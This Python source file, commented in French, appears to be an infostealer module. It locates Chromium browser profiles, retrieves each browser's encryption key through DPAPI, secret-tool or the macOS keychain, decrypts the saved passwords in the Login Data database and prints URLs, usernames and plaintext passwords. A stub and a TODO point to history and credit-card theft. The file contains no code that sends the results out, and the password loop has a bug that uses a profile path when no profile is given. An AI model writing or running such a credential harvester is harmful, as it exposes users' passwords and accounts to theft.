from Crypto.Cipher import AES
from classes import Profile, Browser
import subprocess
import shutil
import json
import base64
import os
import sqlite3
import utils


from config import CHROMIUM_BROWSERS

browsers = []

def list_browsers():
    """
    Répertorie les navigateurs Chromium installés sur le système, en différenciant les profils
    """
    global browsers
    # Parcours de la liste des navigateurs
    for browser, paths in CHROMIUM_BROWSERS["browser"].items():
        if utils.IS_WINDOWS:
            user_data_path = paths["windows"]
        elif utils.IS_LINUX:
            user_data_path = paths["linux"]
        else:
            user_data_path = paths["mac"]

        if user_data_path.exists():
            # Création d'une instance de navigateur
            browser = Browser(browser, user_data_path)
            for folder in browser.user_data_path.iterdir():
                if folder.name.startswith("Profile") or folder.name == "Default":
                    # Création d'une instance de profil
                    browser.profiles.append(Profile(folder.name, folder))
                    
            # Ajout du navigateur à la liste
            browsers.append(browser)


# Fonction pour récupérer la clé de chiffrement
def get_encryption_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as file:
            local_state = json.load(file)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]

        if utils.IS_WINDOWS:
            import win32crypt
            return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]

        elif utils.IS_LINUX:
            return subprocess.check_output(
                ["secret-tool", "lookup", "chrome", "os_crypt"]
            ).strip()

        elif utils.IS_MAC:
            return (
                subprocess.check_output(
                    [
                        "security",
                        "find-generic-password",
                        "-s",
                        "Chrome Safe Storage",
                        "-w",
                    ]
                )
                .strip()
                .encode()
            )

    except Exception as e:
        print(f"❌ Erreur récupération clé : {e}")
        return None

# Fonction pour déchiffrer un mot de passe
def decrypt_password(encrypted_password, key):
    try:
        if encrypted_password[:3] != b"v10":
            return "Format inconnu"

        iv = encrypted_password[3:15]  # IV de 12 octets
        payload = encrypted_password[15:-16]  # Données chiffrées
        tag = encrypted_password[-16:]  # Tag d'authentification AES-GCM

        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt_and_verify(payload, tag).decode()
    except Exception:
        return "Format inconnu"

# Fonction pour extraire les mots de passe stockés
def extract_passwords(browser: Browser, profile: Profile = None):
    
    # Récupère le chemin par défaut de la bdd des logins
    logins_db = [browser.user_data_path / CHROMIUM_BROWSERS["db"]["logins"][0]]

    # Si un profil est spécifié, on ajoute le chemin des bdd de logins
    if profile:
        for login_db in CHROMIUM_BROWSERS["db"]["logins"]:
            logins_db.append(profile.profile_path / login_db)

    # On boucle sur tous les chemins potentiels
    for login_db_name in logins_db:
        nb_pass = 0
        login_db = profile.profile_path / login_db_name
        if not login_db.exists():
            continue

        # Copie temporaire du fichier de mots de passe
        temp_db = login_db.with_suffix(".temp")
        shutil.copy(login_db, temp_db)

        try:
            conn = sqlite3.connect(str(temp_db))
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, action_url, username_value, password_value FROM logins")

            counter = 0
            for (
                origin_url,
                action_url,
                username,
                encrypted_password,
            ) in cursor.fetchall():
                password = decrypt_password(encrypted_password, browser.encryption_key)
                if password and password != "Format inconnu":
                    print(f"[🌍] URL d'origine: {origin_url}")
                    print(f"[🌍] URL de login: {action_url}")
                    print(f"[👤] Username: {username}")
                    print(f"[🔑] Password: {password}\n")
                    counter += 1
                    nb_pass += 1
                    # Uniquement les 3 premiers résultats pour tester
                    if counter > 2:
                        break

            conn.close()
            os.remove(temp_db)

        except Exception as e:
            print(f"❌ Erreur extraction {browser} : {e}")

        if nb_pass:
            print(f"🔑 {nb_pass} mot(s) de passe trouvé(s)")


# Fonction pour extraire l'historique de navigation
# def extract_history():


def extract_data():
    print("🔍 Recherche des navigateurs Chromium")
    list_browsers()

    if not browsers:
        print("❌ Aucun navigateur trouvé")
        return
    else :
        print(f"✅ {len(browsers)} navigateurs trouvés")

    for browser in browsers:
        print(f"🤫 Extraction des données pour {browser}")

        # @TODO Ne pas appeler si on ne récupère pas les mots de passe ou les cartes de crédit
        key = get_encryption_key(browser.local_state_path)
        if key is None:
            print(f"❌ Clé de chiffrement non trouvée pour {browser}")
        else:
            print(f"=== Clé de chiffrement trouvée pour {browser} ✅ ===")
            browser.encryption_key = key

        if not browser.profiles:
            extract_passwords(browser)
        else:
            for profile in browser.profiles:
                extract_passwords(browser, profile)
